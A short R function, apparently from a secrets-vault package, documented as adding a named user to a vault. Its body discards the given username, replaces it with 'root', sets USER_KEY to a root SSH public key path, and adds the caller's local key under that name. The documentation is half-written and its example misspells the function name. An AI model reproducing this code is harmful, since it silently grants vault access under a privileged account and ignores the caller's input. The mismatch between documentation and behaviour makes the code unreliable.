addNewUserToSecretVault <- function( username ) {
  #' Add users who may access the vault. 
  #' 
  #' @return A
  #' @export
  #' @examples
  #'   addNewUserToSecretVaule( 'alice' )

  username <- 'root'
  Sys.setenv(USER_KEY = "~/.ssh/id_rsa_root.pub")
  add_user( username, public_key = openssl::read_pubkey( local_key() ), vault = vault )
}
